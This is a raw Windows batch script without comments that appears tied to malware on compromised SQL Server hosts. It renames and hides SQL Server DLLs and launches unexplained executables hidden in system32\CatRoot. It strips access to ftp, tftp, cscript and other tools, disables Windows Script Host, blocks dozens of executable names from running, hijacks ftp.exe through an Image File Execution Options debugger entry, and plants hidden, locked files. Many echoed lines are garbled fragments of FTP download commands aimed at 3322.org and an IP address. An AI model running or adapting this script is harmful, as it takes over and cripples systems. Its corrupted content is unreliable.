@echo off
if exist "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse90.dll
if exist "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse90.dll
if exist "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse90.dll
if exist "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse90.dll
if exist "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse91.dll
if exist "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse91.dll
if exist "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse91.dll
if exist "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse91.dll
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "G:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"

if exist %SystemRoot%\system32\CatRoot\008.exe start %SystemRoot%\system32\CatRoot\008.exe
if exist %SystemRoot%\system32\CatRoot\2004.exe start %SystemRoot%\system32\CatRoot\2004.exe
if exist %SystemRoot%\system32\CatRoot\fyie.exe start %SystemRoot%\system32\CatRoot\fyie.exe
if exist %SystemRoot%\system32\CatRoot\319.exe start %SystemRoot%\system32\CatRoot\319.exe
if exist %SystemRoot%\system32\CatRoot\1139.exe start %SystemRoot%\system32\CatRoot\1139.exe
if exist %SystemRoot%\\system32\\setuplo.exe start %SystemRoot%\\system32\\setuplo.exe
if exist %SystemRoot%\system32\CatRoot\008.exe start %SystemRoot%\system32\CatRoot\008.exe
if exist %SystemRoot%\system32\CatRoot\2004.exe start %SystemRoot%\system32\CatRoot\2004.exe
if exist %SystemRoot%\system32\CatRoot\fyie.exe start %SystemRoot%\system32\CatRoot\fyie.exe
if exist %SystemRoot%\system32\CatRoot\319.exe start %SystemRoot%\system32\CatRoot\319.exe
if exist %SystemRoot%\system32\CatRoot\1139.exe start %SystemRoot%\system32\CatRoot\1139.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\ftp.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\ftp.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\command.com
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\command.com
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\doskey.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\doskey.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\regini.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\regini.exe
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\dllcache\\ftp.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /d system
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\dllcache\\ftp.exe /e /d system
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\regini.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\xcopy.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\tftp.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cscript.exe /e /d system
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\reg.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\reg.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\sc.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\attrib.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\dllcache\\attrib.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\cacls.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\dllcache\\cacls.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cmd.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\cmd.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r +s +h %SystemRoot%\\system32\\net1.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r +s +h %SystemRoot%\\system32\\dllcache\\net1.exe
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_SZ /d 0 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\ /v DisallowRun /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 3 /t REG_SZ /d tmd1.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 4 /t REG_SZ /d tmd2.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 5 /t REG_SZ /d a.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 6 /t REG_SZ /d s.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 7 /t REG_SZ /d 88.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 8 /t REG_SZ /d 89.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 9 /t REG_SZ /d 90.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 10 /t REG_SZ /d 91.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 11 /t REG_SZ /d mn.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 12 /t REG_SZ /d cc.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 13 /t REG_SZ /d tmd.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 14 /t REG_SZ /d tcpips.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 15 /t REG_SZ /d 92.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 16 /t REG_SZ /d 93.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 17 /t REG_SZ /d 94.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 18 /t REG_SZ /d 62.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 19 /t REG_SZ /d mm.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 20 /t REG_SZ /d 520.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 21 /t REG_SZ /d b.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 22 /t REG_SZ /d 55.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 23 /t REG_SZ /d 75.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 24 /t REG_SZ /d yyyy11.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 25 /t REG_SZ /d zzzz11.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 26 /t REG_SZ /d CB.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 27 /t REG_SZ /d aa.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 28 /t REG_SZ /d xiaoyi.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 29 /t REG_SZ /d v6XXaks8.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 30 /t REG_SZ /d ARP.BAT /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 31 /t REG_SZ /d ff.BAT /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 32 /t REG_SZ /d xiaoyi20091.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 33 /t REG_SZ /d xiaoyi20092.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 34 /t REG_SZ /d xiaoyi20093.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 35 /t REG_SZ /d dboysb.bat /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 36 /t REG_SZ /d dboy250.bat /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 37 /t REG_SZ /d mm1.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 38 /t REG_SZ /d cal.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 39 /t REG_SZ /d ft.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 40 /t REG_SZ /d cvbs.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 41 /t REG_SZ /d dvbs.vbs /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 42 /t REG_SZ /d cc.bat /f
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\export\\nvuninm.bat /e /t /g everyone:F
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\export\\nvuninm.bat /e /t /g system:F
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ras\\dels.bat /e /t /g everyone:F
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ras\\dels.bat /e /t /g system:F

if exist %SystemRoot%\system32\\attrib.exe attrib -h -s -r %SystemRoot%\\system32\\export\\nvuninm.bat
echo @echo off >%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /t /g everyone:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\reg.exe /e /t /g everyone:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cmd.exe /e /t /g everyone:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /t /g system:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\reg.exe /e /t /g system:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cmd.exe /e /t /g system:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\currentversion\image file execution options\ftp.exe" /f >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /t /g everyone:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\reg.exe /e /t /g everyone:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cmd.exe /e /t /g everyone:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /t /g system:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\reg.exe /e /t /g system:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cmd.exe /e /t /g system:F >>%SystemRoot%\\system32\\export\\nvuninm.bat
echo reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\currentversion\image file execution options\ftp.exe" /f >>%SystemRoot%\\system32\\export\\nvuninm.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s %SystemRoot%\\system32\\export\\nvuninm.bat

if exist %SystemRoot%\system32\\attrib.exe attrib -r -s -h -a %SystemRoot%\\ime\\imejp\\nvunins.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /d everyone>%SystemRoot%\\ime\\imejp\\nvunins.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h +a %SystemRoot%\\ime\\imejp\\nvunins.bat
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\ime\\imejp\\nvunins.bat /e /d system
if exist %SystemRoot%\system32\\attrib.exe attrib -r -s -h -a %SystemRoot%\\msapps\\del.bat
echo reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\currentversion\image file execution options\ftp.exe" /v Debugger /t REG_SZ /d ctfmon.exe /f>%SystemRoot%\\msapps\\del.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /d everyone>>%SystemRoot%\\msapps\\del.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h +a %SystemRoot%\\msapps\\del.bat

echo ?*?ftp-s:?G*??dboy?G*sb.sy?G*ysG*??Gdell0startearexer >%SystemRoot%\\debug\\kao.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\debug\\kao.bat
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\debug\\kao.bat /e /d system
echo ?G*??Gmore?*???G*??G*???G*??G*?????G*??win32G >%SystemRoot%\\system32\\\wbem\\\a.exe
echo ?G*??Gmore??*?win32??G*??G*???*??G*??G?*??G*??*??G*?*??G >%SystemRoot%\\system32\\\wbem\\\b.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\\wbem\\\a.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\\wbem\\\b.exe
echo ?G?ftp?Gtencent?.sys?delG?err?G?? >%SystemRoot%\\system32\\sysme.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\sysme.bat
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\sysme.bat /e /d system
echo ?ftGp??Gopen?get?G?bye??exit?G??G*ysG*??Gdell >%SystemRoot%\\system32\\zzxxxd.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zzxxxd.sys
echo ????ftGp??Gopen?get?G?bye??exi??G?t?G??G*ysG*??Gdell?G??G? >%SystemRoot%\\system32\\zzjkxs.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zzjkxs.sys
echo ?G??G?ftp?G?G???G??G? >%SystemRoot%\\system32\\system2.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\system2.bat
echo ?G??G??G?ftp?G?G? >%SystemRoot%\\system32\\system1.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\system1.bat
echo ?G??G?open?3322get?G?bye??exi??G?t?G??G*ysG*??Gdell?G??G? >%SystemRoot%\\system32\\zHZ69jR8.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zHZ69jR8.sys
echo ?ope?G?q54526??486.332?G?.org?G?az??G?qwe??G???G?exe??G?:\v6XXaks8??G?e??G? >%SystemRoot%\\system32\\v6XXaks8.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\v6XXaks8.sys
echo ?G??G?open?3322ge?G?t?G?by?G?e??exi??G??G? >%SystemRoot%\\system32\\tencent.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\tencent.sys
echo ft:cc.usysMu4:?startu4:cc.exeMu4:?pinMu4:?gu4:127.0.0.1startCMu4:?\cc.exedelCMu4:?Programu4:Files\MicrosoftMu4:?Server\MSSQMu4:?binn\odsole70.dllMu4:?:\PrograFiles\MMu4:?sofSQLerver\Mu4:?QL\Binn\odsoe70.dlldMu4:?\ProgrFiles\MicrosofMu4:?LServer\MSSQL\BinMu4:?dsole7dllnMu4:?arMu4:?qlserver>%SystemRoot%\\system32\\cc.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cc.bat
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cc.bat /e /d system
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cc.bat /e /d everyone
echo open?G?3322get?G?exe?G?bye?Ger? >%SystemRoot%\\system32\\cc.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cc.sys
echo ?G???open?G?33G?G?G22G?G?Gget?G?eG?G?Gxe?G?bye?Ger??G??G? >%SystemRoot%\\system32\\G3i2Ll.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\G3i2Ll.sys
echo ?G?errorbye?G??G??G?G?open?3322G.or?get?exe? >%SystemRoot%\\system32\\setupla.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\setupla.sys
echo ?G??G?G??G?win32xe?G? >%SystemRoot%\\system32\\setupla.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\setupla.exe
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\setupla.exe /e /d everyone
echo ?G??G?G?G??G?win32xe?G?G??G?win32xe?G??G?win32xe?G? >%SystemRoot%\\system32\\setuplc.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\setuplc.exe
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\setuplc.exe /e /d everyone

echo G??G?erroru4:byeu4:?G??G??G?G?open3322?G.or?get?exe? >%SystemRoot%\\system32\\tcpyi.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\tcpyi.sys
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\tcpyi.sys /e /d system
echo ÏµÍ³ÕÒ²»µ½Ö¸¶¨µÄÎÄ¼þ¡£ >%SystemRoot%\\system32\\tcpyi.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\tcpyi.exe
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\tcpyi.exe /e /d system

if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\tmprun.bat /e /d system

echo M?G??G?errorbyeM??G??G??M?G?G?open3322?G.or?get?exe? >%SystemRoot%\\system32\\xiaoyi20091.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\xiaoyi20091.sys
echo M?G??G?M?errorbye?G??G?M??G?G?open3322?G.or?get?exe? >%SystemRoot%\\system32\\xiaoyi20092.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\xiaoyi20092.sys
echo M?G??G?errorbyeM??G??M?G??G?G?open3322?G.or?get?exe? >%SystemRoot%\\system32\\xiaoyi20093.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\xiaoyi20093.sys

echo G??G?errorbye?G?yantou?1343G?G?open3322?G.or?yatou2get?exe? >%SystemRoot%\\system32\\arphrosr1.tbl
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\arphrosr1.tbl

echo G??G?errorbye?G?yantou?1343G?G?open3322?G.or?yatou22009get?exe? >%SystemRoot%\\system32\\arphrosr2.tbl
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\arphrosr2.tbl
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\arphrosr2.tbl /e /d system

echo G??G?error32?G?.org?G?az??G?bye?G?y?open3322?32?G?.org?G?az??G?G.or?yatou22009get?exe? >%SystemRoot%\\system32\\setuplc.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\setuplc.sys

if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cal.exe /e /d system
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ft.exe /e /d system
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cvbs.exe /e /d system
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\dvbs.vbs /e /d system

if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\wbem\\\dboysb.sys /e /d everyone

echo openMu4:3322.org?getMu4:?Mubye4:error33G?G?G22G?G?? >%SystemRoot%\\system32\\spcmd.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\spcmd.sys
echo ?G???GG?3322.org?getM?G?u4:?M?bye?CM?G??start CMu4:G??G? >%SystemRoot%\\system32\\zxxyyy.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zxxyyy.sys
echo ?MCMopenMu4?G?3322?M.org?getM?G?u4:?Mu4bye?CMu4:?start CMu4:G?error:?  >%SystemRoot%\\system32\\tcpips.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\tcpips.sys
echo ?G???G??G??G??G?G??G?G??G? >%SystemRoot%\\system32\\Ls09.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\Ls09.sys
echo ?openMu4:3322.?org?getMu4:?Mubye4:error33G?G?G22G?G??? >%SystemRoot%\\system32\\gx.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\gx.sys
echo ?G??G??G??win32more?G????G? >%SystemRoot%\\system32\\f.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\f.exe
echo ?G??G??G?more?G?????G? >%SystemRoot%\\system32\\mm.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\mm.exe
echo ?G??G?more?G??G?more?more?G?G?????G? >%SystemRoot%\\system32\\mm1.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\mm1.exe
echo ?G??G??G?morwin32e?G??????G? >%SystemRoot%\\system32\\cmd.txt
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cmd.txt
echo ?G??G??G?more?G?G????G? >%SystemRoot%\\system32\\c.txt
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\c.txt
echo ?G??G??win32?G?more?G?G???G? >%SystemRoot%\\system32\\setup.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\setup.exe
echo o??MG?pen??MG?8.215.65.6?M?Mcom41700?M35239?M3??MG?ge??MG?eb\mm1.exeG?pbye??MG?y|cacls G?pndir%\system32G?p\ftp.exeG?peveryone:MG? >%SystemRoot%\\system32\\cc1.txt
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cc1.txt
echo ?M??MG??G??win32?G??M?M?G??M?G?exer >%SystemRoot%\\s.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\s.exe
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\s.exe /e /d everyone
echo ?G??win32?G??G??G??G??G?G? >%SystemRoot%\\tmd1.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\tmd1.exe
echo ?G??G?win32??G??G??G???G? >%SystemRoot%\\tmd2.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\tmd2.exe
echo ?G??G?win32?G??G?G???G??G? >%SystemRoot%\\tmd.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\tmd.exe
echo ?G??G??G??win32?G??G??G? >%SystemRoot%\\a1.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\a1.exe
echo ?G??G??G??win32?G??G??G? >%SystemRoot%\\a2.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\a2.exe
echo ??G??G?G?win32??G???G??G? >%SystemRoot%\\se.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\se.exe
del %SystemRoot%\\62.exe
echo ?G??G??G?win32?G???GEàèEàè?G?G??G??G??errG?win >>%SystemRoot%\\62.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\62.exe
echo ?G??G???G??GEàè?G???pen nmvcEàèEàè?G????GG????G? >c:\boot.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\boot.exe
echo EàèEàè?G???pen nmvcEàèEàè?G???22.orEàèEàè?G???liujuEàèEàè?G???123456EàèEàè?G???weblog.jEàèEàè?G???cmd.exeEàèEàè?G???ye >c:\explorer
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\explorer
echo EàèEàè?G???pen hire.3322àèEàè?G???22.orEàèEàèwdw523?liujuEàèEàè?G???EàèEàè?G???1.exEàèEàè?G???aa?.exeEàèEàè?G??? >c:\gz
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\gz
echo ?win32G??G??G??G???GGEàèEàè?G????G??EàèerrEàè?G??G??G?G? >c:\sc.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\sc.exe
if exist %SystemRoot%\system32\\cacls.exe cacls.exe c:\sc.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe c:\sc.exe /e /d system
echo ?G??G?openEàè3322org?G?EàègetEàèexe?G?bye?G??EàèEàèG??G?G?exi >c:\cc.txt
